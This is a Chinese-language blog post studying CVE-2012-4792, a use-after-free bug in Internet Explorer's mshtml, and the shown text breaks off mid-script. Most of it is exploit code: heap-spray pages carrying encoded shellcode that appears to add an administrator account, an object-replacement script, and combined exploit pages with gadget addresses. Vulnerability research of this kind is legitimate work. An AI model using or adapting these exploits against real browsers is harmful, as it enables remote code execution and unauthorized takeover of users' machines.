<figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="attribute">e0</span> = document.getElementById(<span class="string">"a"</span>)<span class="comment">;</span></div><div class="line"><span class="attribute">e1</span> = document.createElement(<span class="string">"div"</span>)<span class="comment">;</span></div><div class="line"><span class="attribute">e2</span> = document.createElement(<span class="string">"q"</span>)<span class="comment">;</span></div><div class="line">...</div></pre></td></tr></table></figure>
<pre><code>网上找了些关于js语法的东西
applyElement方法
语法：
object . applyElement ( oElement , sWhere )
参数：
oElement :　 必选项。对象(Element)。要被添加的对象。
sWhere :　 可选项。字符串(String)。outside 
------解决方案--------------------
 inside ：
 outside:　默认值。将 oElement 添加为 object 的父对象。
 inside :　 将 oElement 添加为 object 的子对象。但 oElement 将成为object 的原所有子对象的父对象。
</code></pre><p>e1.applyElement(e2); 就是把 e2 作为 e1 对象的 “父亲”</p>
<pre><code>大概的流程 是这样的 
</code></pre><p><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/poc_analyse.png"/></p>
<p>触发漏洞的应该是 :<br/> <code>e2.innerHTML = "";</code><br/>这行代码，触发了对象的释放<br/> <code>e2.appendChild(document.createElement('body'));</code><br/>这行代码触发了 对象的 重用，最终导致了 UAF 漏洞的发生</p>
<h4 id="编写exp"><a class="headerlink" href="#编写exp" title="编写exp"></a>编写exp</h4><pre><code>利用堆喷射，执行任意代码。
</code></pre><p>对象重用的时候，崩溃代码<br/><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">7161e1cb 8b07            <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>]  <span class="built_in">ds</span>:002b:09064fa8=????????</div><div class="line">7161e1cd <span class="number">57</span>              <span class="keyword">push</span>    <span class="built_in">edi</span></div><div class="line">7161e1ce 8975c4          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">3Ch</span>],<span class="built_in">esi</span></div><div class="line">7161e1d1 8975d4          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">2Ch</span>],<span class="built_in">esi</span></div><div class="line">7161e1d4 8975dc          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">24h</span>],<span class="built_in">esi</span></div><div class="line">7161e1d7 8975d8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">28h</span>],<span class="built_in">esi</span></div><div class="line">7161e1da 8975e0          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">20h</span>],<span class="built_in">esi</span></div><div class="line">7161e1dd 8975e4          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1Ch</span>],<span class="built_in">esi</span></div><div class="line">7161e1e0 ff90dc000000    <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">0DCh</span>]</div></pre></td></tr></table></figure></p>
<p>  前面分析过了，edi指向的是 button对象的地址，如果把它第一个dword 改成<code>0x0c0c0c0c</code>,<br/>  并且之前使用了heap spray，会使得程序很大的内存(包括 0x0c0c0c0c)都是 <code>0c0c0c0c+shellcode</code> 块。<br/>那么假设 <code>eax+0xDC</code> 也是 <code>0x0c0c0c0c</code> 的话，<code>call dword ptr [eax+0DCh]</code>就会去到 <code>0x0c0c0c0c</code> 地址处执行.</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;script&gt;</div><div class="line"><span class="comment">//堆喷射</span></div><div class="line"> <span class="comment">//Fix BSTR spec</span></div><div class="line">4 function alloc(bytes, mystr) {</div><div class="line">44 <span class="keyword">while</span> (mystr.length&lt;bytes) mystr += mystr<span class="comment">;</span></div><div class="line">44 <span class="keyword">return</span> mystr.substr(<span class="number">0</span>, (bytes-<span class="number">6</span>)/<span class="number">2</span>)<span class="comment">;</span></div><div class="line">4 }</div><div class="line"></div><div class="line">4 block_size = <span class="number">0</span>x1000<span class="comment">;</span></div><div class="line">4 padding_size = <span class="number">0</span>x5FC<span class="comment">; //offset to 0x0c0c0c0c inside our 0x1000 hex block</span></div><div class="line">4 Padding = ''<span class="comment">;</span></div><div class="line">4 NopSlide = ''<span class="comment">;</span></div><div class="line"></div><div class="line">4 var Shellcode = unescape('<span class="built_in">%ud</span>231<span class="built_in">%u</span>30b2<span class="built_in">%u</span>8b64<span class="built_in">%u</span>8b12<span class="built_in">%u</span>0c52<span class="built_in">%u</span>528b<span class="built_in">%u</span>8b1c<span class="built_in">%u</span>0842<span class="built_in">%u</span>728b<span class="built_in">%u</span>8b20<span class="built_in">%u</span>8012<span class="built_in">%u</span>0c7e<span class="built_in">%u</span>7533<span class="built_in">%u</span>89f2<span class="built_in">%u</span>03c7<span class="built_in">%u</span>3c78<span class="built_in">%u</span>578b<span class="built_in">%u</span>0178<span class="built_in">%u</span>8bc2<span class="built_in">%u</span>207a<span class="built_in">%uc</span>701<span class="built_in">%ued</span>31<span class="built_in">%u</span>348b<span class="built_in">%u</span>01af<span class="built_in">%u</span>45c6<span class="built_in">%u</span>3e81<span class="built_in">%u</span>6957<span class="built_in">%u</span>456e<span class="built_in">%uf</span>275<span class="built_in">%u</span>7a8b<span class="built_in">%u</span>0124<span class="built_in">%u</span>66c7<span class="built_in">%u</span>2c8b<span class="built_in">%u</span>8b6f<span class="built_in">%u</span>1c7a<span class="built_in">%uc</span>701<span class="built_in">%u</span>7c8b<span class="built_in">%ufcaf</span><span class="built_in">%uc</span>701<span class="built_in">%u</span>4b68<span class="built_in">%u</span>6e33<span class="built_in">%u</span>6801<span class="built_in">%u</span>4220<span class="built_in">%u</span>6f72<span class="built_in">%u</span>2f68<span class="built_in">%u</span>4441<span class="built_in">%u</span>6844<span class="built_in">%u</span>726f<span class="built_in">%u</span>2073<span class="built_in">%u</span>7468<span class="built_in">%u</span>6172<span class="built_in">%u</span>6874<span class="built_in">%u</span>6e69<span class="built_in">%u</span>7369<span class="built_in">%u</span>2068<span class="built_in">%u</span>6441<span class="built_in">%u</span>686d<span class="built_in">%u</span>6f72<span class="built_in">%u</span>7075<span class="built_in">%u</span>6368<span class="built_in">%u</span>6c61<span class="built_in">%u</span>6867<span class="built_in">%u</span>2074<span class="built_in">%u</span>6f6c<span class="built_in">%u</span>2668<span class="built_in">%u</span>6e20<span class="built_in">%u</span>6865<span class="built_in">%u</span>4444<span class="built_in">%u</span>2620<span class="built_in">%u</span>6e68<span class="built_in">%u</span>2f20<span class="built_in">%u</span>6841<span class="built_in">%u</span>6f72<span class="built_in">%u</span>334b<span class="built_in">%u</span>3368<span class="built_in">%u</span>206e<span class="built_in">%u</span>6842<span class="built_in">%u</span>7242<span class="built_in">%u</span>4b6f<span class="built_in">%u</span>7368<span class="built_in">%u</span>7265<span class="built_in">%u</span>6820<span class="built_in">%u</span>7465<span class="built_in">%u</span>7520<span class="built_in">%u</span>2f68<span class="built_in">%u</span>2063<span class="built_in">%u</span>686e<span class="built_in">%u</span>7865<span class="built_in">%u</span>2065<span class="built_in">%u</span>6368<span class="built_in">%u</span>646d<span class="built_in">%u</span>892e<span class="built_in">%ufee</span>5<span class="built_in">%u</span>534d<span class="built_in">%uc</span>031<span class="built_in">%u</span>5550<span class="built_in">%ud</span>7ff')<span class="comment">;</span></div><div class="line"></div><div class="line">4 <span class="keyword">for</span> (p = <span class="number">0</span><span class="comment">; p &lt; padding_size; p++){</span></div><div class="line">44Padding += unescape('<span class="built_in">%u</span>1c1c')<span class="comment">;</span></div><div class="line">4}</div><div class="line"></div><div class="line">4 <span class="keyword">for</span> (c = <span class="number">0</span><span class="comment">; c &lt; block_size; c++){</span></div><div class="line">44NopSlide += unescape('<span class="built_in">%u</span>1c1c')<span class="comment">;</span></div><div class="line">4 } <span class="comment">//shellcode hou</span></div><div class="line">4 NopSlide = NopSlide.substring(<span class="number">0</span>,block_size - (Shellcode.length + Padding.length))<span class="comment">;</span></div><div class="line"></div><div class="line">4 var OBJECT = Padding + Shellcode + NopSlide<span class="comment">;</span></div><div class="line">4 OBJECT = alloc(<span class="number">0</span>xfffe0, OBJECT)<span class="comment">; // 0xfffe0 = 1mb</span></div><div class="line"></div><div class="line">4 var evil = <span class="keyword">new</span> Array()<span class="comment">;</span></div><div class="line"></div><div class="line">4 <span class="keyword">for</span> (var <span class="keyword">k</span> = <span class="number">0</span><span class="comment">; k &lt; 150; k++) {</span></div><div class="line">44evil[<span class="keyword">k</span>] = OBJECT.substr(<span class="number">0</span>, OBJECT.length)<span class="comment">;</span></div><div class="line">4 }</div><div class="line">4 alert('spray done !')<span class="comment">;</span></div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>效果图<br/><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/heap_spary.png"/></p>
<p>之后，根据 button 对象的大小去构造，实现占位。</p>
<p>对  mshtml!CButton::CreateElement  下断点 调试<br/><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/size.png"/></p>
<pre><code>对象大小是 0x58
</code></pre><p>利用占位脚本</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!doctype html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">     <span class="keyword">var</span> arr_div = <span class="keyword">new</span> <span class="built_in">Array</span>();</div><div class="line">     <span class="keyword">var</span> junk=<span class="built_in">unescape</span>(<span class="string">"%u4142"</span>);</div><div class="line"></div><div class="line">     <span class="keyword">while</span> (junk.length &lt; (<span class="number">0x100</span>- <span class="number">6</span>)/<span class="number">2</span>){</div><div class="line">       junk+=junk;</div><div class="line">     }</div><div class="line">4 <span class="comment">//alert("1");</span></div><div class="line">     <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) </span>{</div><div class="line">44 <span class="keyword">var</span> e0 = <span class="literal">null</span>;</div><div class="line">    	 <span class="keyword">var</span> e1 = <span class="literal">null</span>;</div><div class="line">    	 <span class="keyword">var</span> e2 = <span class="literal">null</span>;</div><div class="line">    	 <span class="keyword">try</span> {</div><div class="line">    		  e0 = <span class="built_in">document</span>.getElementById(<span class="string">"a"</span>);</div><div class="line">    		  e1 = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</div><div class="line">    		  e2 = <span class="built_in">document</span>.createElement(<span class="string">"q"</span>);</div><div class="line">    		  e1.applyElement(e2);</div><div class="line">    		  e1.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'button'</span>));</div><div class="line">    		  e1.applyElement(e0);</div><div class="line">    		  <span class="comment">//vuln here</span></div><div class="line">    		  e2.innerHTML = <span class="string">""</span>;</div><div class="line">    		  e2.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'body'</span>));</div><div class="line">    	 } <span class="keyword">catch</span>(e) { }</div><div class="line">    		CollectGarbage();</div><div class="line">44 <span class="comment">//alert("2");</span></div><div class="line">44 <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i&lt;<span class="number">0x150</span>; i++){</div><div class="line">444arr_div[i]= <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</div><div class="line">444arr_div[i].title= junk.substring(<span class="number">0</span>,(<span class="number">0x58</span><span class="number">-6</span>)/<span class="number">2</span>);</div><div class="line">44}</div><div class="line">44 <span class="comment">//alert("3");</span></div><div class="line">4}</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"exploit()"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"a"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>前前后后调试了好久，最终对象占位成功<br/><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/obj_takeup.png"/></p>
<p>之后，结合之前的<code>heap spray</code>脚本 ，先 <code>spray</code> 去喷射<code>shellcode</code>，然后触发漏洞，对象占位，就可以执行代码了。</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">&lt;!doctype html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;script&gt;</div><div class="line"><span class="comment">/////////////////////////////////////////////</span></div><div class="line">4 function alloc(bytes, mystr) {</div><div class="line">44 <span class="keyword">while</span> (mystr.length&lt;bytes) </div><div class="line">444mystr += mystr<span class="comment">;</span></div><div class="line">44 <span class="keyword">return</span> mystr.substr(<span class="number">0</span>, (bytes-<span class="number">6</span>)/<span class="number">2</span>)<span class="comment">;</span></div><div class="line">4 }</div><div class="line"></div><div class="line">4 block_size = <span class="number">0</span>x1000<span class="comment">;</span></div><div class="line">4 padding_size = <span class="number">0</span>x5FC<span class="comment">; //offset to 0x0c0c0c0c inside our 0x1000 hex block</span></div><div class="line">4 Padding = ''<span class="comment">;</span></div><div class="line">4 NopSlide = ''<span class="comment">;</span></div><div class="line"></div><div class="line">4 var Shellcode =unescape('<span class="built_in">%ud</span>231<span class="built_in">%u</span>30b2<span class="built_in">%u</span>8b64<span class="built_in">%u</span>8b12<span class="built_in">%u</span>0c52<span class="built_in">%u</span>528b<span class="built_in">%u</span>8b1c<span class="built_in">%u</span>0842<span class="built_in">%u</span>728b<span class="built_in">%u</span>8b20<span class="built_in">%u</span>8012<span class="built_in">%u</span>0c7e<span class="built_in">%u</span>7533<span class="built_in">%u</span>89f2<span class="built_in">%u</span>03c7<span class="built_in">%u</span>3c78<span class="built_in">%u</span>578b<span class="built_in">%u</span>0178<span class="built_in">%u</span>8bc2<span class="built_in">%u</span>207a<span class="built_in">%uc</span>701<span class="built_in">%ued</span>31<span class="built_in">%u</span>348b<span class="built_in">%u</span>01af<span class="built_in">%u</span>45c6<span class="built_in">%u</span>3e81<span class="built_in">%u</span>6957<span class="built_in">%u</span>456e<span class="built_in">%uf</span>275<span class="built_in">%u</span>7a8b<span class="built_in">%u</span>0124<span class="built_in">%u</span>66c7<span class="built_in">%u</span>2c8b<span class="built_in">%u</span>8b6f<span class="built_in">%u</span>1c7a<span class="built_in">%uc</span>701<span class="built_in">%u</span>7c8b<span class="built_in">%ufcaf</span><span class="built_in">%uc</span>701<span class="built_in">%u</span>4b68<span class="built_in">%u</span>6e33<span class="built_in">%u</span>6801<span class="built_in">%u</span>4220<span class="built_in">%u</span>6f72<span class="built_in">%u</span>2f68<span class="built_in">%u</span>4441<span class="built_in">%u</span>6844<span class="built_in">%u</span>726f<span class="built_in">%u</span>2073<span class="built_in">%u</span>7468<span class="built_in">%u</span>6172<span class="built_in">%u</span>6874<span class="built_in">%u</span>6e69<span class="built_in">%u</span>7369<span class="built_in">%u</span>2068<span class="built_in">%u</span>6441<span class="built_in">%u</span>686d<span class="built_in">%u</span>6f72<span class="built_in">%u</span>7075<span class="built_in">%u</span>6368<span class="built_in">%u</span>6c61<span class="built_in">%u</span>6867<span class="built_in">%u</span>2074<span class="built_in">%u</span>6f6c<span class="built_in">%u</span>2668<span class="built_in">%u</span>6e20<span class="built_in">%u</span>6865<span class="built_in">%u</span>4444<span class="built_in">%u</span>2620<span class="built_in">%u</span>6e68<span class="built_in">%u</span>2f20<span class="built_in">%u</span>6841<span class="built_in">%u</span>6f72<span class="built_in">%u</span>334b<span class="built_in">%u</span>3368<span class="built_in">%u</span>206e<span class="built_in">%u</span>6842<span class="built_in">%u</span>7242<span class="built_in">%u</span>4b6f<span class="built_in">%u</span>7368<span class="built_in">%u</span>7265<span class="built_in">%u</span>6820<span class="built_in">%u</span>7465<span class="built_in">%u</span>7520<span class="built_in">%u</span>2f68<span class="built_in">%u</span>2063<span class="built_in">%u</span>686e<span class="built_in">%u</span>7865<span class="built_in">%u</span>2065<span class="built_in">%u</span>6368<span class="built_in">%u</span>646d<span class="built_in">%u</span>892e<span class="built_in">%ufee</span>5<span class="built_in">%u</span>534d<span class="built_in">%uc</span>031<span class="built_in">%u</span>5550<span class="built_in">%ud</span>7ff')<span class="comment">;</span></div><div class="line"></div><div class="line">4 <span class="keyword">for</span> (p = <span class="number">0</span><span class="comment">; p &lt; padding_size; p++){</span></div><div class="line">44Padding += unescape('<span class="built_in">%u</span>1c1c')<span class="comment">;</span></div><div class="line">4}</div><div class="line"></div><div class="line">4 <span class="keyword">for</span> (c = <span class="number">0</span><span class="comment">; c &lt; block_size; c++){</span></div><div class="line">44NopSlide += unescape('<span class="built_in">%u</span>1c1c')<span class="comment">;</span></div><div class="line">4 } <span class="comment">//shellcode hou</span></div><div class="line">4 </div><div class="line">4 NopSlide = NopSlide.substring(<span class="number">0</span>,block_size - (Shellcode.length + Padding.length))<span class="comment">;</span></div><div class="line"></div><div class="line">4 var OBJECT = Padding + Shellcode + NopSlide<span class="comment">;</span></div><div class="line">4 OBJECT = alloc(<span class="number">0</span>xfffe0, OBJECT)<span class="comment">; // 0xfffe0 = 1mb</span></div><div class="line"></div><div class="line">4 var evil = <span class="keyword">new</span> Array()<span class="comment">;</span></div><div class="line">4 </div><div class="line">4 <span class="keyword">for</span> (var <span class="keyword">k</span> = <span class="number">0</span><span class="comment">; k &lt; 150; k++) {</span></div><div class="line">44evil[<span class="keyword">k</span>] = OBJECT.substr(<span class="number">0</span>, OBJECT.length)<span class="comment">;</span></div><div class="line">4 }</div><div class="line">4 alert('spray done !')<span class="comment">;</span></div><div class="line">4</div><div class="line">4</div><div class="line"><span class="comment">/////////////////////////////////////////////	</span></div><div class="line">4<span class="comment">/*</span></div><div class="line">     var arr_div = new Array();</div><div class="line">     var junk_1=unescape("%u1c1c");</div><div class="line"></div><div class="line">     while (junk_1.length &lt; (0x100- 6)/2){</div><div class="line">       junk_1+=junk_1;</div><div class="line">     }</div><div class="line">4 */</div><div class="line">4 <span class="comment">//alert("1");</span></div><div class="line">     function exploit() {</div><div class="line">44 var e0 = null<span class="comment">;</span></div><div class="line">    	 var e1 = null<span class="comment">;</span></div><div class="line">    	 var e2 = null<span class="comment">;</span></div><div class="line">    	 <span class="keyword">try</span> {</div><div class="line">    		  e0 = document.getElementById(<span class="string">"a"</span>)<span class="comment">;</span></div><div class="line">    		  e1 = document.createElement(<span class="string">"div"</span>)<span class="comment">;</span></div><div class="line">    		  e2 = document.createElement(<span class="string">"q"</span>)<span class="comment">;</span></div><div class="line">    		  e1.applyElement(e2)<span class="comment">;</span></div><div class="line">    		  e1.appendChild(document.createElement('button'))<span class="comment">;</span></div><div class="line">    		  e1.applyElement(e0)<span class="comment">;</span></div><div class="line">    		  <span class="comment">//vuln here</span></div><div class="line">    		  e2.innerHTML = <span class="string">""</span><span class="comment">;</span></div><div class="line">444</div><div class="line">    		  e2.appendChild(document.createElement('body'))<span class="comment">;</span></div><div class="line">    	 } <span class="keyword">catch</span>(e) { }</div><div class="line">    		CollectGarbage()<span class="comment">;</span></div><div class="line">44 <span class="comment">//alert("2");</span></div><div class="line">44 <span class="comment">/*</span></div><div class="line">44 for(var i = 0; i&lt;0x250; i++){</div><div class="line">444arr_div[i]= document.createElement("div");</div><div class="line">444arr_div[i].title= junk_1.substring(0,(0x58-6)/2);</div><div class="line">44}</div><div class="line">44*/</div><div class="line">44 <span class="comment">//alert("3");</span></div><div class="line">4}</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body onload=<span class="string">"exploit()"</span>&gt;</div><div class="line">&lt;form id=<span class="string">"a"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/exp_debug.png"/><br/>可以看到 <code>heap spray</code> 成功，触发漏洞成功，关键就在 对象占位了，调试走起。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">&lt;!doctype html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;script&gt;</div><div class="line">    var arr_div = new Array();</div><div class="line">    var junk=unescape(<span class="string">"%u0b30%u0c0c"</span>);</div><div class="line">    <span class="keyword">while</span> (junk.length &lt; (<span class="number">0x100</span>- <span class="number">6</span>)/<span class="number">2</span>)</div><div class="line">    {</div><div class="line">     junk+=junk;</div><div class="line">    }</div><div class="line">    var nops=unescape(<span class="string">"%u9090%u9090"</span>);</div><div class="line">    <span class="keyword">while</span>(nops.length&lt;<span class="number">0x400</span>) nops+=nops;</div><div class="line">    <span class="keyword">while</span>(nops.length&lt;<span class="number">0x5f2</span>) nops+=unescape(<span class="string">"%ub30e%u51c3"</span>);</div><div class="line">    nops+=unescape(<span class="string">"%u198c%u51be"</span>);</div><div class="line">    var code = unescape(<span class="string">"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c"</span>+</div><div class="line">444444<span class="string">"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c"</span>+</div><div class="line">444444<span class="string">"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c"</span>+</div><div class="line">4444444  <span class="string">"%ud231%u30b2%u8b64%u8b12%u0c52%u528b%u8b1c%u0842%u728b%u8b20"</span>+</div><div class="line">4444444  <span class="string">"%u8012%u0c7e%u7533%u89f2%u03c7%u3c78%u578b%u0178%u8bc2%u207a"</span>+</div><div class="line">4444444  <span class="string">"%uc701%ued31%u348b%u01af%u45c6%u3e81%u6957%u456e%uf275%u7a8b"</span>+</div><div class="line">4444444  <span class="string">"%u0124%u66c7%u2c8b%u8b6f%u1c7a%uc701%u7c8b%ufcaf%uc701%u4b68"</span>+</div><div class="line">4444444  <span class="string">"%u6e33%u6801%u4220%u6f72%u2f68%u4441%u6844%u726f%u2073%u7468"</span>+</div><div class="line">4444444  <span class="string">"%u6172%u6874%u6e69%u7369%u2068%u6441%u686d%u6f72%u7075%u6368"</span>+</div><div class="line">4444444  <span class="string">"%u6c61%u6867%u2074%u6f6c%u2668%u6e20%u6865%u4444%u2620%u6e68"</span>+</div><div class="line">4444444  <span class="string">"%u2f20%u6841%u6f72%u334b%u3368%u206e%u6842%u7242%u4b6f%u7368"</span>+</div><div class="line">4444444  <span class="string">"%u7265%u6820%u7465%u7520%u2f68%u2063%u686e%u7865%u2065%u6368"</span>+</div><div class="line">4444444  <span class="string">"%u646d%u892e%ufee5%u534d%uc031%u5550%ud7ff"</span>);</div><div class="line">    var offset=<span class="number">0x5F4</span>;</div><div class="line">    var junk_offset=nops.substring(<span class="number">0</span>,<span class="number">0x5F4</span>);</div><div class="line">    var shellcode=junk_offset+code+nops.substring(<span class="number">0</span>,<span class="number">0x800</span>-<span class="number">0x5F4</span>-code.length);</div><div class="line">    <span class="keyword">while</span>(shellcode.length&lt;<span class="number">0x40000</span>)</div><div class="line">    {</div><div class="line">        shellcode+=shellcode;</div><div class="line">    }</div><div class="line">    var block = shellcode.substring(<span class="number">0</span>,<span class="number">0x40000</span>);</div><div class="line">    var heap_chunks = new Array();</div><div class="line">    <span class="keyword">for</span> (var i=<span class="number">1</span>; i &lt; <span class="number">500</span>; i++) </div><div class="line">        heap_chunks[i] = block.substring(<span class="number">0</span>,<span class="number">0x40000</span>);</div><div class="line">    function helloWorld() </div><div class="line">    {</div><div class="line">          var e<span class="number">0</span> = null;</div><div class="line">          var e1 = null;</div><div class="line">          var e2 = null;</div><div class="line"></div><div class="line">          try </div><div class="line">          {</div><div class="line">               e<span class="number">0</span> = document.getElementById(<span class="string">"a"</span>);</div><div class="line">               e1 = document.getElementById(<span class="string">"b"</span>);</div><div class="line">               e2 = document.createElement(<span class="string">"q"</span>);</div><div class="line">               e1.applyElement(e2);</div><div class="line">               e1.appendChild(document.createElement(<span class="string">'button'</span>));</div><div class="line">               e1.applyElement(e<span class="number">0</span>);</div><div class="line">               e2.outerText = <span class="string">""</span>;</div><div class="line">               e2.appendChild(document.createElement(<span class="string">'body'</span>));</div><div class="line">          } catch(e) { }</div><div class="line">          CollectGarbage();</div><div class="line">           <span class="keyword">for</span>(var i = <span class="number">0</span>; i&lt;<span class="number">0x7000</span>; i++)</div><div 